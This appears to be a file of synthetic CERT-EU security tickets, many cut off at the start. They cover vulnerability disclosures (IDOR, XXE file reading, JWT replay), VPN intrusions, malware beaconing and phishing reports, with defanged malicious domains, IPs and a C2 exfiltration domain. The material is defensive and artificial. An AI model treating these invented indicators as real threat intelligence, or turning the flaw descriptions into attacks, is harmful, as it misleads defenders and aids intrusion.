Our SIEM started throwing alerts late Monday night, mostly on hosts used by the Joint Research Centre (JRC) in Ispra. The pattern lines up with what looks like exploitation attempts targeting the new CVE-2024-20517 (remote code exec in the NetConductor VPN gateway). We saw a sudden spike in outbound connections to two unfamiliar IPs in Singapore and Turkey (neither match our approved vendor list), all over port 8443, and traffic signatures partially overlap with the exploit POC published last week.\n\nI’m not a technical specialist, so sorry if this is light on details. I’ve attached our extracted logs (CSV, sanitized for personal data) and the list of affected asset IDs. The external connections only lasted 2-3 minutes, but one system started beaconing at irregular intervals after the initial burst. Our endpoint protection didn’t flag any malware payloads, but we’re worried this could be a reconnaissance phase before something more serious.\n\nHas anyone else reported scans or exploitation attempts for this VPN bug? Should we be isolating the affected hosts or is monitoring enough for now?

This isn't an emergency, but I wanted to flag it as part of our responsible disclosure process, as per the CERT-EU guidelines.\n\nWhile onboarding several user groups last week, one of our admins noticed some oddities in the document sharing workflow. Specifically, it appears that shared document links generated for internal use (e.g., https://greendocs.eea.europa.eu/share/9jK8XwL) are accessible without authentication if the link is known. We tested this from a non-EEA IP address and confirmed that the document loads directly in the browser, with full editing capabilities, regardless of whether the user is logged in. There is no expiry or IP restriction on these links, and the URLs are relatively short, which could make brute-forcing feasible.\n\nOur internal risk assessment suggests this is an insecure direct object reference (IDOR) issue in the document sharing API. We haven't found evidence of active exploitation, but given the sensitive nature of some environmental policy drafts and datasets shared via this platform, we think the exposure risk is significant.\n\nTo verify, we:\n- Created several test documents and shared them with internal and external users\n- Accessed the shared links from a clean browser session and a VPN outside the EEA network\n- Observed that the API (GET /api/share/{token}) responds with full document data and editing rights, with no access checks\n\nWe haven't attempted any destructive actions or accessed other users' documents, but we believe the flaw could be exploited by anyone who guesses or obtains a valid share token.\n\nI've attached a short report (greendocs_idor_eea2024.pdf) with reproduction steps, screenshots, and HTTP request/response samples. Please let us know if you need further technical details or logs. We’re also happy to coordinate with the GreenDocs vendor on remediation and follow any embargo period you recommend.\n\nThanks for your help.

I am reaching out from the IT administration desk at the European Parliament regarding the recent purchase order (PO-IT-00917) for Bitwarden Enterprise password management licenses, which we initiated last month as part of the wider credential hygiene rollout. \n\nEarlier today, we received an invoice from the vendor (CyberVault Solutions GmbH, invoice #CVS-2024-1298) for the full license volume, but the attached supporting documents appear incomplete. Specifically, the purchase agreement does not include the annex on EU data residency assurances, which was a mandatory compliance item flagged in our internal procurement checklist. This omission was also highlighted during the pre-award compliance review with DG DIGIT.\n\nAdditionally, the invoice references a VAT number not matching the one previously listed in the vendor registration file. I have cross-checked this against the VIES system and flagged the inconsistency to our finance unit, but would appreciate your confirmation that the supplier’s details have not changed since the original tender submission. If a revised invoice or updated documentation is required, please advise on the proper channel for requesting corrections from CyberVault Solutions.\n\nCould you also clarify whether the standard vendor onboarding process for cybersecurity software suppliers has been updated in light of the recent guidance from the Internal Audit Service? Our records show that the last due diligence review for this vendor was completed in January, but I am unsure if any additional administrative steps are now required before we can proceed with payment. If so, please specify whether further documentation (e.g., latest ISO 27001 certificate, DPA addendum) needs to be obtained and how best to transmit these securely.\n\nFinally, the delivery confirmation for the license activation codes was received yesterday, but the distribution list included a generic group mailbox.

As part of the EMA IT Security group, we recently updated our software bill of materials and noticed that the portal’s document submission service relies on the open-source PDFFormHandler library (version 2.1.3), which appears to contain a previously undocumented XML External Entity (XXE) vulnerability.\n\nThe vulnerability was initially flagged by our dependency scanner (OWASP Dependency-Check), but further manual review confirmed that when uploading certain malformed PDF forms, the backend service parses embedded XML without disabling external entity resolution. By crafting a PDF with a maliciously structured XFA form, we were able to cause the backend to fetch arbitrary files from the server’s filesystem (e.g., /etc/hostname) and include their contents in the HTTP response to the client. We did not attempt to access sensitive data or escalate beyond this proof-of-concept.\n\nOur internal testing was limited to a non-production environment, but given the architecture, the same document processing logic is used in production for all user uploads. The affected endpoint is /api/v1/submit-document, and the vulnerable code path is triggered when the uploaded PDF includes an XFA form with an external entity reference. We have attached a sanitized PoC PDF and a redacted Burp Suite log demonstrating the issue.\n\nImpact assessment: An attacker could exploit this flaw to read arbitrary files accessible to the document processing service, potentially exposing configuration files, credentials, or other sensitive information. While we have not observed any exploitation in the wild, the risk is elevated due to the public nature of the endpoint and the routine handling of untrusted user documents.\n\nWe are submitting this report under the CERT-EU Coordinated Vulnerability Disclosure policy and would appreciate guidance on next steps, particularly regarding responsible disclosure to the PDFFormHandler maintainers. Please let us know if you require additional technical details or would like us to assist with further validation. We are ready to coordinate remediation and public advisory timelines as appropriate.\n\nApologies for any formatting issues—typing this up quickly between meetings.

I’m not a security expert myself, but one of our developers flagged this and I promised to pass it along. The team noticed that the system’s REST API (specifically the endpoint POST /api/v2/payrun/submit) does not enforce any IP allowlisting or mTLS, and appears to accept requests from any origin, so long as a session token is provided.\n\nThe bigger concern is that, when testing session expiry, our devs found that an expired JWT token could be replayed for several minutes after its stated expiry time. In one case, an old token (expired for 7+ minutes) was still accepted and the API processed the submission. No rate limiting or invalidation was triggered. We confirmed this behavior with two separate test users (finance-auditor1 and payroll-admin3), but didn’t attempt any actual data modification beyond test payloads.\n\nWe’re worried this could allow an attacker with access to a stale token (via phishing or some other means) to submit or alter payroll data, especially since the API is reachable externally. I’ve attached logs showing the replayed request, server response (HTTP 200), and timestamps. No PII or sensitive data included, just dummy entries. Our IT department is not sure if this is a config oversight or something deeper in the session validation logic — the vendor is investigating, but as we’re handling EU personnel payroll, we thought it best to escalate via CERT-EU’s responsible disclosure framework.\n\nWe’d appreciate guidance on whether this falls under coordinated disclosure, and if there’s an embargo or notification policy we should follow with the vendor. We’re still waiting for their security team to respond, but can loop in your contacts if needed. Please let us know if more technical detail or a joint troubleshooting session is required.\n\nApologies if this is a bit outside my usual remit — just want to make sure nothing falls through the cracks.\n\nBest regards,\n\nLucie Bernard\nDirector of Finance Operations\nEuropean Commission – DG BUDG\nlucie.bernard@ec.europa.eu", "created_date": "2024-08-18T00:00:00", "email_address": "lucie.bernard@ec.europa.eu", "llm_queue": "OFFSEC::CVD"}

Apologies if this isn’t the right place.\n\nWe’ve been seeing a spike in outbound connections from several workstations in our Brussels office to what appears to be a rarely-used TOR exit node (176.115.83.72) since last Friday afternoon. The traffic pattern is odd—connections occur in short bursts (usually 7-10 minutes), mostly between 02:00 and 04:00 CET, and are always initiated from the same three endpoints (HR-WS-14, LEGAL-WS-08, and ADMIN-WS-03). None of these users report any knowledge of TOR usage or have legitimate business reasons for this kind of traffic.\n\nOur internal scans flagged two unfamiliar executable files in the AppData\\Local\\Temp directories on the affected machines: ‘update-hrsvc2.exe’ and ‘docsigner-temp3.exe’.

We recently received the pro forma invoice (ref: ESET2024-PO-CEU-19) from your vendor relations desk, and before proceeding with the final approval, I would like to clarify a few administrative details to ensure compliance with both internal and inter-institutional procurement guidelines.\n\nFirstly, could you confirm whether the total number of endpoints (listed as 320 in the attached quote) reflects the most up-to-date inventory post the recent hardware refresh in April? Our records indicate a slight discrepancy, as we decommissioned 12 legacy devices during the last quarter. If there is a reconciliation report available, it would be helpful to cross-check figures before we validate the PO.\n\nSecondly, the invoice specifies a three-year term, whereas our initial request was for a two-year renewal to align with our budget planning cycle. Please advise if the vendor is flexible on this point or if a contract amendment is required. If so, could you provide the standard template for amendment requests or direct me to the relevant SharePoint location? \n\nLastly, we noticed that the invoice includes a line item for \"advanced threat analytics module\" which, to our knowledge, was not part of the original RFP. Kindly confirm whether this was bundled at no extra cost, or if there will be an additional administrative step to approve this module separately.\n\nFor your reference, I have attached the scanned PO draft and the vendor’s quote (both in PDF). If there are any missing documents or forms you need from our side to expedite the approval, please let me know. Our finance controller is keen to finalize this before the end of the fiscal quarter to avoid any service gaps in endpoint protection coverage.\n\nThank you in advance for your assistance.

Earlier today (22/07/2024, approx. 08:55 CET), our remote access monitoring flagged a sequence of failed and then successful VPN logins from a non-EU IP (89.34.190.118) to our internal Parliament VPN portal (vpn-ep-intra.secure.europa.eu). The user in question, 'marion.klein', is on scheduled leave and should have no active sessions. \n\nVPN logs ([openvpn.log], [radius-auth.log]) show 17 failed attempts with various device fingerprints, then a successful login at 08:56 CET using what appears to be an outdated Android client (User-Agent: OpenVPN_2.5.3-android/Android10). This was immediately followed by abnormal download patterns—over 900MB of data transferred from the secure legislative repository (docs-legis.priv.ep.europa.eu), mostly PDFs marked 'Restricted – Internal Use Only'.\n\nWe’ve already force-disabled the user account and revoked the VPN token, but the activity window lasted ~17 minutes. SIEM correlation suggests the same source IP probed at least three other user accounts (see attached log snippets), though those logins failed. There’s also a suspicious session token reuse event noted in [radius-auth.log], which we haven’t seen before.\n\nWe suspect either credential theft or token compromise, possibly linked to recent phishing activity. There’s no evidence of malware on the user’s assigned device (checked via Defender ATP), but we haven’t yet performed a full forensic image. Network firewall logs indicate outbound connections to hxxps://dropsecure[.]eu/fileshare during the VPN session, which may point to data exfiltration attempts.\n\nRequesting urgent support for:\n- Review of attached logs (openvpn-snippet-0722.txt, radius-events.csv)\n- Guidance on further user/device forensics\n- Recommendations for broader credential resets and VPN policy changes (MFA is in pilot, not enforced for all)\n- Assessment of notification obligations (GDPR/NIS2)\n\nPlease let us know if you require additional artifacts or can join a call with our local response team this afternoon.

Over the past 10 days, we’ve observed a spike in beaconing traffic from several French regional administrative offices to a previously untracked set of IPv6 addresses, all resolving via the DNS-over-HTTPS resolver operated by \"PrivAnon\" (not previously seen in our threat feeds).\n\nKey details:\n- Initial access appears to be brokered via forum posts on hxxps://eurozonegate[.]onion, advertising access to \".gouv\" and \".europa.eu\" subnets.\n- Our sandboxed detonation of a dropped loader (SHA256: 4f7b8e1b...7c2d9a) indicates the malware attempts outbound TLS connections to hxxps://vuln-exfil[.]pro, with fallback to IPv6 endpoints in the 2a0b:dbc0:42::/48 range.\n- TTPs include scheduled task creation (T1053.005) and use of WinHTTP for stealthy exfiltration (T1071.001), mapped via MITRE ATT&CK.\n- Payment for access is facilitated exclusively via Monero, and the actor’s handle (“BlueWren”) is advertising weekly updates on compromised EU endpoints.\n\nEnclosed is a STIX 2.1 export (password: ctiFR2024) with IOCs (domains, IPs, hashes) and a brief markdown summary of our analysis. At this stage, attribution is low-confidence, but some overlap exists with infrastructure previously flagged by CERT-NL during their Q2 threat landscape review (see MISP event #2024-2371).\n\nWe’re continuing to monitor for further activity and have notified affected French entities via our sectoral CERT channels. Would appreciate any cross-correlation you can provide, especially regarding:\n- Similar C2 patterns or actor mentions in your dark web monitoring\n- Observed traffic to the same IPv6 netblocks or domains in other EU member states\n- Recommendations for detection rules or YARA signatures\n\nSorry for the quick dump—will send a more formal write-up once I’m back at my desk.

While attending a virtual coordination meeting on 2 July 2024, I noticed my account was unexpectedly logged out, and upon re-authentication, the application displayed session details (including partial token values and user identifiers) directly in the browser console.\n\nSubsequent review of the browser’s developer tools revealed that sensitive session tokens were being transmitted in plaintext as part of WebSocket messages and persisted in local storage. These values appear accessible to any script running within the browser context, increasing the risk of token theft via XSS or browser extensions. I attempted standard troubleshooting steps (application restart, cache clear, system update), but the issue recurred across multiple devices and browsers.

The message claims to be from the 'EU Digital Identity Team' and requests that I \"confirm my account details to maintain secure access to inter-institutional collaboration platforms.\" The sender address is digital-id-support@eu-parliament-verify[.]org, which immediately struck me as odd since it does not match our standard @europarl.europa.eu format.\n\nThe email contains a button labeled \"Verify Now\" which links to hxxps://eu-id-portal[.]com/secure-update (defanged for safety). The message is written in formal English, references GDPR compliance, and warns that failure to act will result in \"temporary suspension of digital services.\" There are no attachments, but the footer uses a generic logo and the signature simply says \"EU Digital Identity Team.\"\n\nI have not clicked the link and have advised my colleagues to be cautious. The timing is concerning as we recently had internal communications about upcoming changes to our digital authentication process, so this could be an attempt to exploit that context.

I'm reaching out from the Directorate-General for Budget (DG BUDG) regarding the upcoming cross-institutional cybersecurity awareness workshop scheduled for the end of July in Brussels. We’ve received the preliminary agenda from your team and would like to confirm a few administrative details to ensure everything runs smoothly on our end.\n\nFirst, could you please clarify the process for registering external speakers, particularly those from the European Court of Auditors and ENISA? We’ve had some confusion over which forms are needed for non-Commission participants and whether additional vetting is required. If you could forward the latest version of the participant registration template (preferably as an editable file), that would help a lot. Also, is there a central contact for last-minute changes or late confirmations?\n\nOn logistics, our department is responsible for organizing local accommodation and transport for visiting staff, but we’re unsure about the per diem rates and allowable expenses for short-term stays under the new administrative guidelines (I think they were updated this spring?). Could you send over the current policy or point me to the right SharePoint folder? We’ve had a couple of cases in the past where expense claims were returned due to outdated forms, so just want to avoid any issues this time.\n\nAdditionally, do you have a recommended template for the attendance certificates? We want to ensure these are in line with the Commission’s official format and include any cybersecurity-specific endorsements your team may require. If there are digital signature requirements, please flag them, as we’re still adjusting to the new e-signature rollout (which, by the way, has been working better lately – thanks for the earlier support!).\n\nLastly, would you prefer to handle catering arrangements centrally, or should we coordinate directly with the venue? Our team is happy to help, but just need to know which process to follow so we don’t duplicate efforts or miss any compliance steps.\n\nSorry for the long list – appreciate your patience! Let me know if you’d prefer a quick call to run through these points, or if you need more info from our side. Looking forward to working together on a successful event.\n\nBest regards,\n\nJonas van Dijk\nAdministrative Officer, Directorate-General for Budget\nEuropean Commission\njonas.vandijk@ec.europa.eu", "created_date": "2024-12-03T00:00:00", "email_address": "jonas.vandijk@ec.europa.eu", "llm_queue": "SMS"}

Our monitoring has surfaced chatter indicating active exploitation attempts targeting these devices, with actors referencing custom loader malware and phishing lures tailored for R&D personnel.\n\nEnclosed you will find a STIX export containing newly observed hashes (SHA256), C2 domains (e.g., hxxps://vr-control[.]xyz), and related TTPs.

We are currently in the midst of an internal network penetration test (as part of our annual NIS2 compliance review), and have encountered a critical issue that requires immediate attention.\n\nFollowing a scheduled update to our domain controller infrastructure (Windows Server 2022, patch KB5034125), we have observed that encrypted communications between several audit workstations and our central file share (\\fileshare.audit.ec.europa.eu) are intermittently failing. Despite several server restarts and a rollback of the patch, the problem persists: Kerberos ticket exchanges appear to be rejected, and some SMB sessions are now transmitting in plaintext rather than over the expected encrypted channel (SMB3 with mandatory encryption).\n\nGiven that the penetration test involves simulated lateral movement and credential access scenarios, we are concerned that this unexpected drop in encryption may expose sensitive data or authentication tokens to potential interception—even within our segmented test environment. We have attached a set of network traces (see: ECA_NetLogs_20240621.pcap) and a screenshot of the observed event log errors.\n\nCould your team urgently review the attached artefacts and advise on (a) whether this behaviour is related to test activities or the recent patch, and (b) immediate steps to restore secure communication? We would also appreciate guidance on any additional compensating controls to deploy while the investigation is ongoing. The disruption is affecting our ability to safely proceed with the remaining penetration test scenarios, and business operations are being impacted.\n\nThank you in advance for your prompt assistance.\n\nBest regards,\n\nMarta Nowak\nIT Security Specialist\nEuropean Court of Auditors\n\nAttachment: ECA_NetLogs_20240621.pcap, EventLog_Error_Screenshot.png", "created_date": "2024-11-22", "email_address": "marta.nowak@eca.europa.eu", "llm_queue": "OFFSEC::Pentesting"}

The logs show repeated push attempts from IP 91.198.123.45, which, if I recall correctly, matches the address block you sent last week for the ongoing penetration test.\n\nWe also noticed that after several failed 2FA tokens, the account was suddenly able to authenticate and access a couple of restricted CI/CD repos – specifically ‘infra-ansible’ and ‘secops-pipeline’. No actual changes or pushes, just a handful of GET requests and pipeline config downloads. The SIEM (we use Elastic/Kibana) shows the login flow included an unexpected fallback to backup codes (which are only supposed to be available to the account owner). We haven’t seen this sequence before, so not sure if it’s a simulated bypass or an actual bug.\n\nCould you confirm if this pattern is part of your test scenario, or if we need to escalate internally? The devs are a bit nervous since these repos touch our production deployment workflows. I’ve attached the relevant auth logs and a screenshot from Kibana. Also, do you need us to temporarily unlock the ‘svc_dataops’ account for further testing, or should we leave it as-is for now?\n\nSorry for the rush – we’re trying to avoid triggering an incident response unless it’s absolutely necessary.

{"ticket_id": "TKT-435E3731", "title": "Phishing Suspicion: Unusual ECB Security Audit Invitation Targeting DG HOME Staff", "content": "Hi CERT-EU DFIR team,\n\nI wanted to flag a strange email that landed in my inbox earlier today (see below for details). I’m not sure if it’s a phishing attempt or just a weird vendor notification, but it looked off enough that I figured it’s better to check. I’m a policy officer, so apologies if I miss any technical details – I’ve pasted the main info as best I can.\n\nThe message came from what looks like a legitimate European Central Bank address (european-central@ecb-eu-alerts[.]org), but the domain is a bit odd. The subject was: “URGENT: Confirm Your Participation in ECB Annual Security Audit”. It says I need to click a link to confirm my attendance at a security audit next week. The link (I didn’t click, just hovered!) is hxxps://ecb-security-check[.]org/confirm (I replaced the dots for safety, as our IT training says).\n\nThe body of the email is pretty formal, but there are some awkward phrases, like “Your prompt action is mandatory to avoid exclusion from audit compliance.” It also mentions that failure to respond will be reported to my department head, which seems a bit threatening for a simple event invite. There’s a PDF attached called “ECB_Audit_Notice_2024.pdf” but I haven’t opened it.\n\nI checked with my line manager and no one in our unit (DG HOME, Policy Support) has heard about any audit like this. We usually get audit notifications through official channels, not random emails. The signature block uses the ECB logo, but it’s blurry and the phone number listed is just a string of zeros. Also, the reply-to address is different from the sender: audit-confirm@ecb-audit-support[.]org.\n\nNot sure if I’m overreacting, but the whole thing feels off. I’ve attached the email as an .eml file (headers included) and a screenshot. I haven’t interacted with the link or the attachment, and I’ve warned my colleagues not to respond if they get something similar.\n\nPlease let me know if this is a known phishing campaign or just a one-off. Should we block the sender or do anything else? Sorry if this is a false alarm, but I’d rather be safe.\n\nThanks for your help!\n\nBest,\n\nMartina Rossi\nPolicy Officer\nDG HOME – European Commission", "created_date": "2024-08-16T00:00:00", "email_address": "martina.rossi@ec.europa.eu", "llm_queue": "DFIR::phishing"}
{"ticket_id": "TKT-7FF307E0", "title": "Clarification Needed on Onboarding Procedures for External Secondees – Danish NCSC Integration (Administrative Coordination", "content": "Dear CERT-EU HR Administration,\n\nI am writing to request clarification and support regarding the updated onboarding process for external secondees, specifically in relation to recent changes in the submission of security clearance documentation and contractual paperwork. We have two new colleagues from the Danish National Cyber Security Centre scheduled to begin their secondment at CERT-EU on 8 July, and we are encountering some confusion regarding the necessary administrative steps to finalise their onboarding.\n\nPreviously, our team submitted scanned copies of national security vetting certificates directly via the SecureDocs platform. However, the most recent communication from your office (dated 3 June) indicated a shift to using the eSignEU system for all sensitive document transfers and contract signatures. Unfortunately, our external partners are reporting persistent access issues when attempting to authenticate on eSignEU using their national eID cards (NemID), resulting in failed logins and incomplete uploads. We have attached screenshots of the error messages (defanged as per guidelines) and can provide further technical details if required.\n\nAdditionally, we are unclear about the deadlines for submitting the original hardcopy contracts and whether remote onboarding is permissible for the initial orientation week. Given the cross-border nature of this arrangement and ongoing travel restrictions, it would be helpful to have written confirmation of acceptable procedures for remote induction and any required forms (e.g., badge pre-registration, IT access request, GDPR training acknowledgment). Our Danish colleagues are eager to ensure full compliance with both CERT-EU and Commission standards, but we are keen to avoid administrative delays that could affect their planned start date.\n\nCould you kindly advise on the following points:\n- Is it possible to process security vetting documents via SecureDocs until eSignEU access is resolved?\n- What is the current policy regarding remote onboarding for external secondees, and are there any specific forms or checklists to complete?\n- Are digital signatures on contracts considered legally binding for secondments from non-EU national agencies?\n\nIf a coordination call would help clarify the process, we are available later this week. Please let us know if there are updated guidelines or templates we should share with our partners.
